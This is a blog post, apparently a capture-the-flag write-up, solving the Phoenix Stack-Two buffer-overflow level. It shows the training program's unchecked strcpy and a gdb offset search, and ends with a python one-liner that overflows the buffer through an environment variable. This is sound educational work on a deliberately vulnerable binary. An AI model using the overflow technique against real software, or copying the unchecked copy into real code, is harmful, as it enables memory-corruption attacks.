---
title: Phoenix Stack-Two 
author: Marius Kimmina
date: 2019-10-20 14:10:00 +0800
categories: [CTF, Binary Exploitation]
tags: [Buffer Overflow]
published: true
---

### 0x0. Introduction
For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One).
In this level we have to mess with environment variables and unprintable ascii characters. Also instead of "gets" this program
uses "strcpy" to write to the buffer-variable. 

### 0x1. Taking a look at the source code

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

The difference to Stack-one is that we have to set an environment variable named ExploitEducation as described here:

```c
ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }
```

and the value of this variable will be written into the buffer-variable. I'm going to quote the bugs section for "strcpy" here, it has essentially the same problem as "gets".

```
If the destination string of a strcpy() is not large enough, then  any‐
thing  might  happen.   Overflowing  fixed-length  string  buffers is a
favorite cracker technique for taking complete control of the  machine.
Any  time  a  program  reads  or copies data into a buffer, the program
first needs to check that there's enough space.  This may  be  unneces‐
sary  if you can show that overflow is impossible, but be careful: pro‐
grams can get changed over time, in ways that may make  the  impossible
possible.
```


### 0x2 Exploiting the program

Lets start by simply trying to execute the program

```bash
$ /opt/phoenix/amd64/stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
stack-two: please set the ExploitEducation environment variable
```

There are multiple ways to set an environment variable but since we want to take a look at it in gdb anyway, lets do it there

```
$ gdb /opt/phoenix/amd64/stack-two
(gdb) set environment ExploitEducation Awesome
```

Once this is done you run the program (still inside gdb because changing environment variables in gdb has no effect outside of gdb)

```
(gdb) run
Starting program: /opt/phoenix/amd64/stack-two 
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```

as you can see the prompt for setting the environment variable is gone. Now we need to figure out the right value for our ExploitEducation-variable.
First we need to know at what point exactly we start writing to the "changeme" variable. To accomplish that, use a very long and recognisable pattern.
I always suggest the alphabet. 

```
(gdb) set environment ExploitEducation AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZ
(gdb) run
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x51515151, we want 0x0d0a090
```

Since 0x51 is the hexadecimal equivalent to the letter Q, we know that we have to replace "QQQQ" with the correct input.  
The big problem here is that "0x0d0a090a" are non-printable characters thus we can't just append them to our alphabet string.
This took we quite some time to find a working solution and I would have liked to find a way to do it without leaving gdb but 
I could not.  
So here is my solution for this challenge setting the environment variable with our alphabet string followed by the hexadecimal value decoded in python:


```
$ export ExploitEducation=`python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" + ("0a090a0d").decode("hex")'`
$ /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```



